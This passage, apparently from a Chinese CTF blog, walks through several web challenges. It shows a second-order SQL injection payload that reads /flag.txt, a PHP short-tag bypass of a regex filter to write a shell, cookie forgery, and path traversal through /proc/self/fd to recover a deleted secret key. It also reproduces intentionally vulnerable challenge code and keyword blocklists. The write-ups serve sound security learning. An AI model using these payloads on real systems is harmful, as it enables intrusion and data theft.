class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;删除订单&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;删除订单&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;姓名:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;电话:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;删除订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot; <span class="title">style</span>=&quot;<span class="title">color</span>:#<span class="title">ffffff</span>;&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;返回&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要查订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要修改收货地址&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过代码审计可以发现，user_name和phone都进行了严格的过滤，但是address只用addslashes()对预定义字符进行了转义，所以address参数为可以利用的注入点</p><p>由于address被addslashes()转义以后单引号等无法使用，但是更新地址时，会将旧地址保存下来，所以我们只要将在第一次修改地址时输入SQL注入语句，在第二次更新时（随便输），第一次更新的SQL语句会被调用从而引发二次注入。</p><p><img src="../images/image-20230507213726053.png" alt="image-20230507213726053"></p><p>因为报错注入最长输出32位所以分两次读取。</p><p>先去提交订单</p><p><img src="../images/image-20230507214302818.png" alt="image-20230507214302818"></p><p>这样的话地址和姓名电话就会存在数据库里</p><p><img src="../images/image-20230507214334374.png" alt="image-20230507214334374"></p><p>根据这段代码，在下次进行地址的修改的时候，就会执行old_address里面我们之前存放的代码</p><p>然后就会输出flag了</p><p><img src="../images/image-20230507214513864.png" alt="image-20230507214513864"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>接下来查询后面的字段同理</p><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是题目给的代码</p><p>首先通读代码，了解到该题提供了查看路径和写入文件的功能，但是存在WAF机制，不允许写入黑名单中的内容。使用echo标记简写<code>&lt;?=</code>绕过<code>&lt;?php</code>的限制，再用<code>.</code>来连接p和hp，因为分号被过滤掉了，只执行一行语句可以省略：</p><p><img src="../images/image-20230708155040772.png" alt="image-20230708155040772"></p><p>这里的话不用为数组  直接进行下一层来绕过check就行了</p><p><code>/?action=upload&amp;data=&lt;?=(ph.pinfo)()?&gt;</code></p><p>接着<code>/?action=pwd</code>  访问被写入路径  </p><p><img src="../images/image-20230708155349795.png" alt="image-20230708155349795"></p><p><img src="../images/image-20230708155443350.png" alt="image-20230708155443350"></p><p>成功写入</p><p>那么就是可以使用  短标签和   <strong>( ` )</strong>  来进行绕过了</p><p><img src="../images/image-20230708160035046.png" alt="image-20230708160035046"></p><p>这里加个知识点就是 在使用php段标签的时候  代码末尾可以不用加上 <strong>(;)</strong> </p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p><img src="../images/image-20230708160312655.png" alt="image-20230708160312655"></p><p>考察的是个cookie伪造</p><p>先抓个包</p><p><img src="../images/image-20230708160525827.png" alt="image-20230708160525827"></p><p>有两个参数  看看这个cookie能不能进行直接解码查看</p><p><img src="../images/image-20230708160614777.png" alt="image-20230708160614777"></p><p>可以直接解码查看  没有加安全验证啥的   于是修改金额</p><p>令id为2就行</p><p><img src="../images/image-20230708160731271.png" alt="image-20230708160731271"></p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>题目</p><p><img src="../images/image-20230708161028840.png" alt="image-20230708161028840"></p><p>只有一个框</p><p>随便输点东西进去</p><p><img src="../images/image-20230708161226736.png" alt="image-20230708161226736"></p><p>得到这样的结果</p><p>进行进行文件读取的话是可以读出来的</p><p><img src="../images/image-20230708161513887.png" alt="image-20230708161513887"></p><p><img src="../images/image-20230708161523663.png" alt="image-20230708161523663"></p><p>这里是个非预期解</p><p>直接就可以读取flag了</p><p><img src="../images/image-20230708161633608.png" alt="image-20230708161633608"></p><p><strong>预期解</strong></p><p>这里考察的是可以尝试利用 <strong>/proc 目录</strong>下的敏感文件进行利用。</p><p><strong>首先读取<code>/proc/self/cmdline</code>来获取启动当前题目进程的完整命令：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=../../../../../../../proc/self/cmdline</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230708162059860.png" alt="image-20230708162059860"></p><p>看到一个app.py 尝试读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关键点在这里</p><p><img src="../images/image-20230708162943356.png" alt="image-20230708162943356"></p><p>就是获取到key之后就可以进行<code>os.system(shell)</code> 来执行命令了</p><p>但是这个key的话是直接包含的话是获取不到的 </p><p><img src="../images/image-20230708163120933.png" alt="image-20230708163120933"></p><p>打开之后就直接删除了</p><p>但是这里有一个小利用点就是</p><p><strong>但在 linux 系统中如果一个程序用<code>open()</code>打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容</strong>。/proc/[pid]/fd 这个目录里包含了进程打开文件的情况，目录里面有一堆/proc/[pid]/fd/id文件，id就是进程记录的打开文件的文件描述符的序号。我们通过对id的爆破，得到<code>/tmp/secret.txt</code>文件描述符的序号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/fd/3</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230708163356446.png" alt="image-20230708163356446"></p><p>于是访问<code>/no_one_know_the_manager</code>  传key和shell就行了</p><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 